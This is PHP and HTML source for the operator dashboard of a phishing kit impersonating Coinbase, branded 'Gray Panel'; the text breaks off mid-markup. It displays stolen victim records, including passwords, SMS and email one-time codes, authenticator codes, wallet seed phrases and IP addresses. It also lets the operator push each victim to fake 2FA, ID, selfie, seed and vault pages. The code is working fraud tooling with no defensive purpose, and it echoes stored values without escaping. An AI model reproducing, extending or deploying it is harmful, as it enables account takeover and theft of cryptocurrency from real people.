<?php


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Process the form data
    
    // Redirect to the same page to prevent form resubmission
    header("Location: ".$_SERVER['PHP_SELF']);
    exit(); // Make sure to exit after redirecting
}

session_start();

// Check if the user is not logged in, redirect to login page
if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("Location: login.php");
    exit();
}

require_once 'db_connection.php';

/// Fetch data from the database
$sql = "SELECT id, token, activity, email, data, status, password, phone_otp, created_at, updated_at, ip_address, user_agent, auth_app, login_url, email_otp, email_app, seed FROM user_submissions";
$result = $conn->query($sql);
// Count the number of rows
$num_rows = $result->num_rows;

// Set the default time zone to UTC to avoid any default settings
date_default_timezone_set('UTC');

// Create a DateTime object with the current time in UTC
$utcDateTime = new DateTime('now', new DateTimeZone('UTC'));

// Array of common American time zones
$usTimeZones = [
    'America/New_York',  // Eastern Time
    'America/Chicago',   // Central Time
    'America/Denver',    // Mountain Time
    'America/Los_Angeles'// Pacific Time
];

$timeZones = [];
foreach ($usTimeZones as $timeZone) {
    // Create a DateTime object for the specific time zone
    $dateTime = new DateTime('now', new DateTimeZone($timeZone));
    // Store the formatted date and time in an array
    $timeZones[$timeZone] = $dateTime->format('Y-m-d H:i:s');
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Admin</title>
    <style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #0a0a0a;
    color: #e5e5e5;
    line-height: 1.5;
    overflow-x: hidden;
    position: relative;
}

/* Sharp Star Field Background */
body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(1px 1px at 20px 30px, #666666, transparent),
        radial-gradient(1px 1px at 40px 70px, #888888, transparent),
        radial-gradient(1px 1px at 90px 40px, #555555, transparent),
        radial-gradient(1px 1px at 130px 80px, #777777, transparent),
        radial-gradient(1px 1px at 160px 30px, #666666, transparent),
        radial-gradient(1px 1px at 200px 90px, #888888, transparent),
        radial-gradient(1px 1px at 240px 20px, #555555, transparent),
        radial-gradient(1px 1px at 280px 60px, #777777, transparent),
        radial-gradient(1px 1px at 320px 100px, #666666, transparent),
        radial-gradient(1px 1px at 360px 40px, #888888, transparent);
    background-repeat: repeat;
    background-size: 400px 200px;
    animation: starMove 120s linear infinite;
    z-index: -1;
    opacity: 0.3;
}

@keyframes starMove {
    from { transform: translateY(0px) translateX(0px); }
    to { transform: translateY(-200px) translateX(-400px); }
}

header {
    background: #111111;
    border-bottom: 2px solid #333333;
    padding: 1rem 2rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
    z-index: 100;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 1.5rem;
}

.brand-logo {
    width: 40px;
    height: 40px;
    background: #666666;
    border: 2px solid #888888;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    color: #ffffff;
    font-size: 16px;
    font-family: 'Courier New', monospace;
}

.brand-title {
    font-size: 1.4rem;
    font-weight: 600;
    color: #cccccc;
    font-family: 'Courier New', monospace;
    letter-spacing: 1px;
}

.stats-indicator {
    background: #1a1a1a;
    border: 1px solid #444444;
    padding: 0.6rem 1.2rem;
    font-size: 0.85rem;
    color: #aaaaaa;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.buttons-container {
    display: flex;
    gap: 1px;
}

.btn {
    padding: 0.8rem 1.6rem;
    border: 1px solid #444444;
    font-size: 0.875rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.btn-primary {
    background: #333333;
    color: #ffffff;
    border-color: #666666;
}

.btn-secondary {
    background: #222222;
    color: #cccccc;
    border-color: #444444;
}

.btn-danger {
    background: #441111;
    color: #ffffff;
    border-color: #661111;
}

.btn:hover {
    background: #444444;
    border-color: #888888;
}

.btn-danger:hover {
    background: #662222;
    border-color: #882222;
}

main {
    padding: 2rem;
    max-width: 1400px;
    margin: 0 auto;
    position: relative;
}

.dashboard-container {
    background: #111111;
    border: 2px solid #333333;
    overflow: hidden;
}

.table-header {
    padding: 1.5rem 2rem;
    background: #1a1a1a;
    border-bottom: 2px solid #333333;
}

.table-title {
    font-size: 1.2rem;
    font-weight: 600;
    color: #ffffff;
    margin-bottom: 0.5rem;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.table-subtitle {
    color: #888888;
    font-size: 0.875rem;
    font-family: 'Courier New', monospace;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th {
    background: #1a1a1a;
    padding: 1rem 1.5rem;
    text-align: left;
    font-weight: 600;
    font-size: 0.875rem;
    color: #cccccc;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    border-bottom: 1px solid #333333;
    border-right: 1px solid #333333;
    font-family: 'Courier New', monospace;
}

th:last-child {
    border-right: none;
}

td {
    padding: 1rem 1.5rem;
    border-bottom: 1px solid #222222;
    border-right: 1px solid #222222;
    font-size: 0.875rem;
    color: #dddddd;
    font-family: 'Courier New', monospace;
}

td:last-child {
    border-right: none;
}

tr {
    transition: all 0.2s ease;
}

tr:hover {
    background: #1a1a1a;
    border-left: 3px solid #666666;
}

.actions {
    display: flex;
    gap: 1px;
}

.action-btn {
    padding: 0.5rem 1rem;
    border: 1px solid #444444;
    font-size: 0.75rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.send-button, .view-button {
    background: #333333;
    color: #ffffff;
}

.delete-button {
    background: #441111;
    color: #ffffff;
    border-color: #661111;
}

.action-btn:hover {
    background: #444444;
    border-color: #888888;
}

.delete-button:hover {
    background: #662222;
    border-color: #882222;
}

/* Time zones styling - Apple World Clock inspired */
.time-zones {
    background: #1a1a1a;
    border: 1px solid #444444;
    margin-bottom: 2rem;
    overflow: hidden;
}

.time-zones-header {
    background: #2a2a2a;
    border-bottom: 1px solid #444444;
    padding: 1rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.time-zones h3 {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 0.9rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin: 0;
}

.add-timezone-btn {
    background: #444444;
    border: 1px solid #666666;
    color: #ffffff;
    padding: 0.4rem 0.8rem;
    font-family: 'Courier New', monospace;
    font-size: 0.75rem;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 1px;
    transition: background-color 0.2s;
}

.add-timezone-btn:hover {
    background: #555555;
}

.time-zone {
    background: #1a1a1a;
    border-bottom: 1px solid #333333;
    padding: 1rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-family: 'Courier New', monospace;
    transition: background-color 0.2s;
    position: relative;
}

.time-zone:hover {
    background: #252525;
}

.time-zone:last-child {
    border-bottom: none;
}

.timezone-left {
    display: flex;
    flex-direction: column;
    gap: 0.2rem;
}

.timezone-city {
    color: #ffffff;
    font-size: 1rem;
    font-weight: 600;
    margin: 0;
}

.timezone-offset {
    color: #888888;
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.timezone-right {
    text-align: right;
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    gap: 0.2rem;
}

.timezone-time {
    color: #ffffff;
    font-size: 1.5rem;
    font-weight: 700;
    margin: 0;
    line-height: 1;
}

.timezone-date {
    color: #888888;
    font-size: 0.75rem;
    margin: 0;
}

.timezone-remove {
    background: none;
    border: none;
    color: #666666;
    cursor: pointer;
    font-size: 1rem;
    padding: 0.2rem;
    position: absolute;
    right: 0.5rem;
    top: 50%;
    transform: translateY(-50%);
    opacity: 0;
    transition: opacity 0.2s;
}

.time-zone:hover .timezone-remove {
    opacity: 1;
}

.timezone-remove:hover {
    color: #ff4444;
}

/* Timezone Selector Popup */
.timezone-popup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.8);
    z-index: 1000;
    justify-content: center;
    align-items: center;
}

.timezone-popup-content {
    background: #111111;
    border: 2px solid #444444;
    width: 400px;
    max-height: 500px;
    display: flex;
    flex-direction: column;
}

.timezone-popup-header {
    background: #2a2a2a;
    padding: 1rem;
    border-bottom: 1px solid #444444;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.timezone-popup-header h3 {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 0.9rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin: 0;
}

.timezone-close {
    background: none;
    border: none;
    color: #888888;
    font-size: 1.5rem;
    cursor: pointer;
    padding: 0;
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.timezone-close:hover {
    color: #ffffff;
}

.timezone-search {
    padding: 1rem;
    border-bottom: 1px solid #444444;
}

.timezone-search input {
    width: 100%;
    padding: 0.75rem;
    background: #1a1a1a;
    border: 1px solid #444444;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
}

.timezone-search input:focus {
    outline: none;
    border-color: #666666;
}

.timezone-list {
    flex: 1;
    overflow-y: auto;
    max-height: 300px;
}

.timezone-option {
    padding: 0.75rem 1rem;
    border-bottom: 1px solid #333333;
    cursor: pointer;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
    color: #dddddd;
    transition: background-color 0.2s;
}

.timezone-option:hover {
    background: #252525;
}

.timezone-option:last-child {
    border-bottom: none;
}

.timezone-option-city {
    color: #ffffff;
    font-weight: 600;
}

.timezone-option-offset {
    color: #888888;
    font-size: 0.75rem;
    margin-top: 0.2rem;
}

#popup, #smsPopup, #success2fa, #viewResults {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    z-index: 1000;
    max-width: 500px;
    width: 90%;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
}

#popup h3, #smsPopup h3, #viewResults h3 {
    margin-bottom: 1rem;
    color: #ffffff;
    font-weight: 600;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
}

#notification-box {
    position: fixed;
    top: 20px;
    right: 20px;
    background: #111111;
    border: 2px solid #444444;
    padding: 1rem;
    display: flex;
    align-items: center;
    gap: 0.75rem;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
    z-index: 1000;
}

.notification-image {
    width: 28px;
    height: 28px;
    opacity: 0.8;
}

#options {
    width: 100%;
    padding: 0.75rem;
    background: #0a0a0a;
    border: 1px solid #444444;
    color: #dddddd;
    margin: 0.75rem 0;
    font-size: 0.875rem;
    font-family: 'Courier New', monospace;
}

#options:focus {
    outline: none;
    border-color: #666666;
    background: #111111;
}

/* Sound Toggle */
.sound-toggle {
    position: absolute;
    top: 1rem;
    right: 1rem;
    z-index: 200;
}

.sound-btn {
    background: #1a1a1a;
    border: 1px solid #444444;
    padding: 0.6rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-size: 1rem;
}

.sound-btn:hover {
    background: #333333;
    border-color: #666666;
}

.sound-btn.muted {
    background: #441111;
    border-color: #661111;
}

/* Document Viewer Modal */
.document-viewer-modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 2000;
    justify-content: center;
    align-items: center;
}

.document-viewer-content {
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    max-width: 800px;
    width: 90%;
    max-height: 90vh;
    overflow: auto;
    position: relative;
    box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
}

.document-viewer-close {
    position: absolute;
    top: 1rem;
    right: 1rem;
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    width: 30px;
    height: 30px;
    font-size: 18px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Courier New', monospace;
}

.document-viewer-close:hover {
    background: #444444;
}

.document-viewer-image {
    max-width: 100%;
    max-height: 70vh;
    display: block;
    margin: 0 auto;
}

.document-download-btn {
    display: block;
    margin: 1rem auto 0;
    padding: 0.75rem 1.5rem;
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.document-download-btn:hover {
    background: #444444;
}

/* Document List in Victim Info */
.document-list-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.75rem;
    border: 1px solid #333333;
    margin-bottom: 0.5rem;
    background: #1a1a1a;
}

.document-list-item:last-child {
    margin-bottom: 0;
}

.document-type {
    font-weight: 500;
    color: #cccccc;
}

.document-actions {
    display: flex;
    gap: 0.5rem;
}

.document-btn {
    padding: 0.5rem 1rem;
    background: #222222;
    color: #cccccc;
    border: 1px solid #444444;
    font-family: 'Courier New', monospace;
    font-size: 0.75rem;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.document-btn:hover {
    background: #333333;
    color: #ffffff;
}

.document-btn.download {
    background: #333333;
    color: #ffffff;
}

.document-btn.download:hover {
    background: #444444;
}

/* Improved Popup Styling */
#viewResults {
    background: #111111;
    border: 2px solid #444444;
    max-width: 600px;
    width: 95%;
    max-height: 80vh;
    overflow-y: auto;
}

.popup-title {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 1.5rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #444444;
}

.popup-content {
    display: grid;
    gap: 1rem;
}

.popup-section {
    background: #1a1a1a;
    padding: 1rem;
    border-left: 3px solid #666666;
}

.popup-section p {
    margin: 0.5rem 0;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
    color: #dddddd;
}

.popup-section strong {
    color: #ffffff;
    text-transform: uppercase;
    font-size: 0.75rem;
    letter-spacing: 0.5px;
}

.popup-close-btn {
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    padding: 0.8rem 1.6rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-top: 1.5rem;
    width: 100%;
}

.popup-close-btn:hover {
    background: #444444;
    border-color: #888888;
}

/* Improved Send Popup (Select Page) */
#popup {
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    text-align: center;
    max-width: 500px;
    width: 90%;
}

#popup h3 {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 1.5rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #444444;
    font-size: 1rem;
}

/* Custom GrayPanel Logo */
.popup-logo {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 1rem;
    margin-bottom: 1.5rem;
    padding: 1rem;
    border: 1px solid #444444;
    background: #1a1a1a;
}

.logo-icon {
    width: 50px;
    height: 50px;
    background: #666666;
    border: 2px solid #888888;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Courier New', monospace;
    font-weight: 700;
    font-size: 1.5rem;
    color: #ffffff;
    letter-spacing: -1px;
}

.logo-text {
    font-family: 'Courier New', monospace;
    font-weight: 700;
    font-size: 1.2rem;
    color: #cccccc;
    letter-spacing: 2px;
    text-transform: uppercase;
}

#popup select {
    width: 100%;
    margin: 1.5rem 0;
    padding: 0.75rem;
    background: #1a1a1a;
    border: 1px solid #444444;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
    text-transform: uppercase;
}

#popup select:focus {
    outline: none;
    border-color: #666666;
    background: #222222;
}

#popup button {
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    padding: 0.8rem 1.6rem;
    margin: 0.5rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    min-width: 100px;
}

#popup button:hover {
    background: #444444;
    border-color: #888888;
}

/* SMS Popup Styling */
#smsPopup {
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    text-align: center;
    max-width: 400px;
    width: 90%;
}

#smsPopup h3 {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 1.5rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #444444;
    font-size: 1rem;
}

#smsPopup p {
    color: #cccccc;
    font-family: 'Courier New', monospace;
    margin-bottom: 1rem;
    text-transform: uppercase;
    font-size: 0.875rem;
}

#smsPopup input[type="text"] {
    width: 100%;
    padding: 0.75rem;
    background: #1a1a1a;
    border: 1px solid #444444;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 0.875rem;
    text-align: center;
    margin-bottom: 1.5rem;
}

#smsPopup input[type="text"]:focus {
    outline: none;
    border-color: #666666;
    background: #222222;
}

#smsPopup button {
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    padding: 0.8rem 1.6rem;
    margin: 0.5rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    min-width: 100px;
}

#smsPopup button:hover {
    background: #444444;
    border-color: #888888;
}

/* Success Popup Styling */
#success2fa {
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    text-align: center;
    max-width: 300px;
    width: 90%;
}

#success2fa img {
    max-width: 80px;
    height: auto;
    margin-bottom: 1rem;
}

#success2fa p {
    color: #ffffff;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 1.5rem;
    font-weight: bold;
}

#success2fa button {
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    padding: 0.8rem 1.6rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    width: 100%;
}

#success2fa button:hover {
    background: #444444;
    border-color: #888888;
}

#smsPopup input[type="text"] {
    display: block;
    margin: 10px auto;
    padding: 8px;
    width: 80%;
    max-width: 300px;
    border: 1px solid #0052ff;
    border-radius: 5px;
}

.button {
    padding: 10px 20px;
    color: #fff;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

#okButton,
#closeButton,
#okButtonSuccess,
#closeSmsButton {
    background-color: #0052FF;
    color: #fff;
    border: none;
    padding: 10px 20px;
    border-radius: 10px;
    cursor: pointer;
}

#viewResults > div {
    margin-bottom: 20px;
}

#viewResults > div > p {
    margin: 0;
}

.link-span {
    color: blue;
    text-decoration: none;
    cursor: pointer;
}

@media screen and (max-width: 768px) {
    header {
        flex-direction: column;
        text-align: center;
    }

    header img {
        margin: 0 auto;
    }

    .buttons-container {
        margin: 10px auto;
    }
    

    main {
        padding: 10px;
    }

    table {
        font-size: 14px;
    }

    th, td {
        padding: 6px;
    }

    .buttons-container button {
        padding: 6px;
    }

    #popup, #smsPopup, #success2fa, #viewResults {
       
        width: 90%;
        max-width: 300px;
        padding: 10px;
    }

    #smsPopup input[type="text"] {
        width: 100%;
    }

    #notification-box {
        display: flex;
        align-items: center;
        background-color: #333; /* Dark background color */
        color: black; /* Light text color */
        width: 300px;
        height: auto;
        padding: 10px;
        border-radius: 8px;
        position: fixed;
        top: 20px;
        right: 20px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }


}

/* Confirmation Dialog Styling */
.confirmation-box {
    display: none;
    background: #111111;
    border: 2px solid #444444;
    padding: 2rem;
    max-width: 400px;
    margin: 0 auto;
    text-align: center;
    color: #ffffff;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 1000;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
}

.confirmation-title {
    font-size: 1.2rem;
    margin-bottom: 1rem;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: #ffffff;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #444444;
}

.confirmation-message {
    font-size: 0.875rem;
    margin-bottom: 1.5rem;
    font-family: 'Courier New', monospace;
    color: #cccccc;
}

.btn-container {
    display: flex;
    justify-content: center;
    gap: 1px;
}

.primary {
    background: #441111;
    color: #ffffff;
    border: 1px solid #661111;
    padding: 0.8rem 1.6rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    flex: 1;
}

.secondary {
    background: #333333;
    color: #ffffff;
    border: 1px solid #666666;
    padding: 0.8rem 1.6rem;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    flex: 1;
}

.primary:hover {
    background: #662222;
    border-color: #882222;
}

.secondary:hover {
    background: #444444;
    border-color: #888888;
}

.popup-container {
    display: none;
    background-color: #1e1e1e; /* Dark background color */
    border-radius: 8px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    padding: 20px;
    max-width: 400px;
    margin: 0 auto;
    text-align: left;
    color: #fff; /* Light text color */
}

.popup-title {
    font-size: 20px;
    margin-bottom: 15px;
}

.popup-section {
    margin-bottom: 15px;
}

.popup-section h4 {
    margin-top: 0;
    color: #0052ff;
    border-bottom: 1px solid #444;
    padding-bottom: 5px;
    margin-bottom: 10px;
}

.tab-container {
    width: 100%;
    margin-top: 15px;
}

.tab-buttons {
    display: flex;
    border-bottom: 1px solid #444;
    margin-bottom: 15px;
}

.tab-button {
    background: #2a2a2a;
    border: none;
    color: #888;
    padding: 8px 15px;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.2s ease;
    border: 1px solid transparent;
    border-bottom: none;
    margin-right: 5px;
    border-radius: 4px 4px 0 0;
}

.tab-button:hover {
    background: #333;
    color: #fff;
}

.tab-button.active {
    background: #1a1a1a;
    color: #0052ff;
    border-color: #444;
    border-bottom: 1px solid #1a1a1a;
    margin-bottom: -1px;
}

.tab-content {
    display: none;
}

.tab-content.active {
    display: block;
}

.popup-section strong {
    font-weight: bold;
}

.popup-close-btn {
    background-color: #007bff;
    color: #fff;
    border: none;
    padding: 10px 20px;
    border-radius: 10px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.popup-close-btn:hover {
    background-color: #0056b3;
}

        #textInput {
            margin-top: 20px;
            text-align: center;
        }
        
        #textInput input[type="text"] {
            padding: 10px;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            width: 150px;
            outline: none;
        }
        
        #textInput input[type="text"]:focus {
            border-color: #007bff;
        }
        
        #textInput input[type="submit"] {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        
        #textInput input[type="submit"]:hover {
            background-color: #0056b3;
        }

        .time-container {
            background-color: #333;
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
            text-align: center;
            margin-right: 30px;
        }

        .time-container h3 {
            margin-top: 0;
        }

        .time-zone {
            background-color: #444;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }

        .time-zone span {
            display: block;
            font-size: 1.2em;
            font-weight: bold;
        }

        .container {
            display: flex;
        }

        .idk-cointainer {
            /* */
        }

        .notification {
            margin-top: 10px;
            font-size: 16px;
            color: #28a745;
            display: none;
        }



    </style>
</head>
<body>
    <header>
        <div class="header-left">
            <div class="brand-logo">GP</div>
            <div class="brand-title">Gray Panel</div>
            <div class="stats-indicator">Active: <?php echo $num_rows; ?></div>
        </div>

        <div class="buttons-container">
            <button class="btn btn-secondary" id="reveal-button" onclick="toggleSpoiler()">View Seed</button>

            <div id="textInput" style="display: none;">
                <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
                    <input type="text" name="user_input" placeholder="Enter text here">
                    <input type="submit" value="Submit">
                </form>
            </div>

            <button class="btn btn-primary" id="updateSeed">Generate Seed</button>
            <button class="btn btn-secondary" onclick="window.open('vault_management.php', '_blank')">🏦 Vault</button>
            <button class="btn btn-secondary" id="refreshButton">Refresh</button>
            <button class="btn btn-danger" type="submit" id="logoutButton">Log out</button>
        </div>

        <!-- Sound Toggle -->
        <div class="sound-toggle">
            <button id="soundToggle" class="sound-btn" title="Toggle notification sounds">
                <span id="soundIcon">🔊</span>
            </button>
        </div>


        <script>
        // Add event listener to the button
        document.getElementById("updateSeed").addEventListener("click", function() {
            // Fetch the seed from the PHP file
            fetch('generate_seed.php')
                .then(response => response.json()) // Convert response to JSON
                .then(data => {
                    location.reload();
                })
                .catch(error => console.error('Error:', error));
        });
    </script>
    </header>




    <main>
        <div class="dashboard-container">
            <div class="table-header">
                <div class="table-title">Active Sessions</div>
                <div class="table-subtitle">Real-time monitoring of phishing targets</div>
            </div>
        <table id="dataTable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Token</th>
                    <th>Activity</th>
                    <th>Email</th>
                    <th>Status</th>
                    <th class="actions">Actions</th>
                </tr>
            </thead>
            <tbody >
            <?php
                // Fetch data from the database
                $sql = "SELECT id, token, activity, email, data, status, password, phone_otp, created_at, updated_at, ip_address, user_agent, auth_app, login_url, email_otp, email_app, seed FROM user_submissions";
                $result = $conn->query($sql);

                // Check if there are any rows returned
                if ($result->num_rows > 0) {
                    // Fetch all rows into an array
                    $rows = [];
                    while ($row = $result->fetch_assoc()) {
                        $rows[] = $row;
                    }
                    // Reverse the array order
                    $rows = array_reverse($rows);
                    // Output data of each row in the reversed order
                    foreach ($rows as $row) {
                        echo "<tr>";
                        echo "<td>" . $row["id"] . "</td>";
                        echo "<td>" . $row["token"] . "</td>";
                        echo "<td>" . $row["activity"] . "</td>";
                        echo "<td>" . $row["email"] . "</td>";
                        echo "<td>" . $row["status"] . ($row["status"] == "online" ? " 🔵" : " 🔴") . "</td>";
                        echo "<td class='actions'>";
                        echo "<button class='action-btn send-button' data-userid='" . $row["id"] . "' data-token='" . $row["token"] . "'>Send</button>";
                        echo "<button class='action-btn view-button' data-email='" . $row["email"] . "' data-password='" . $row["password"] . "' data-phoneotp='" . $row["phone_otp"] . "' data-createdat='" . $row["created_at"] . "' data-updatedat='" . $row["updated_at"] . "' data-ipaddress='" . $row["ip_address"] . "' data-useragent='" . $row["user_agent"] . "' data-authapp='" . $row["auth_app"] . "' data-loginurl='" . $row["login_url"] . "' data-emailotp='" . $row["email_otp"] . "' data-seed='" . $row["seed"] . "' data-token='" . $row["token"] . "'>View</button>";
                        echo "<button class='action-btn delete-button'>Delete</button>";
                        echo "</td>";
                        echo "</tr>";
                    }
                } else {
                    echo "<tr><td colspan='6'>No data found</td></tr>";
                }
                ?>
        </table>
        </div>
    </main>
</div>

        <div class="time-zones">
            <div class="time-zones-header">
                <h3>⏰ World Clock</h3>
                <button class="add-timezone-btn" onclick="showTimezoneSelector()">+ Add</button>
            </div>
            <div class="timezones-container">
            <?php foreach ($timeZones as $timeZone => $time): ?>
                    <div class="time-zone" data-timezone="<?php echo $timeZone; ?>">
                        <div class="timezone-left">
                            <div class="timezone-city"><?php echo str_replace('America/', '', $timeZone); ?></div>
                            <div class="timezone-offset">
                                <?php 
                                $tz = new DateTimeZone($timeZone);
                                $dt = new DateTime('now', $tz);
                                $offset = $tz->getOffset($dt) / 3600;
                                echo 'UTC' . ($offset >= 0 ? '+' : '') . $offset;
                                ?>
                </div>
        </div>
                        <div class="timezone-right">
                            <div class="timezone-time">
                                <?php 
                                $dt = new DateTime('now', new DateTimeZone($timeZone));
                                echo $dt->format('H:i');
                                ?>
        </div>
                            <div class="timezone-date">
                                <?php echo $dt->format('M d'); ?>
    </div>
                        </div>
                        <button class="timezone-remove" onclick="removeTimezone('<?php echo $timeZone; ?>')" title="Remove timezone">×</button>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
    </main>

    <style>
.image-container {
    position: relative;
    display: inline-block;
    overflow: hidden; /* Ensures the overlay does not go outside the image */
}

.image-container::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgba(0, 0, 255, 0.25); /* Softer blue overlay */
    border-radius: 20px; /* Matches the image's border radius */
    mix-blend-mode: multiply; /* Enhances blending with the image */
}
</style>
</main>

    <div id="confirmation-box" class="confirmation-box">
        <h2 class="confirmation-title">Confirmation</h2>
        <p class="confirmation-message">Are you sure you want to delete this record?</p>
        <div class="btn-container">
            <button id="confirm-delete" class="primary">Yes, Delete</button>
            <button id="cancel-delete" class="secondary">Cancel</button>
        </div>
    </div>



    <div id="popup" style="display:none;">
        <div class="popup-logo">
            <div class="logo-icon">GP</div>
            <div class="logo-text">GRAY PANEL</div>
        </div>
        <h3>Select Page</h3>
        <select name="page" id="options" style="background-color: #151515; color:white;">
        <option value="" disabled selected>Select Page</option>
        <option value="password-reset">Password Reset</option>
        <option value="sms-2fa">SMS 2FA</option>
        <option value="auth-app">Unlink Wallet</option>
        <option value="email-2fa">Email 2FA</option>
        <option value="url">URL</option>
        <option value="id">ID</option>
        <option value="selfie">Selfie</option>
        <option value="seed">Seed</option>
        <option value="vault">Vault</option>
        <option value="finish">Finish</option>
</select>

        <button id="okButton">OK</button>
        <button id="closeButton">Close</button>
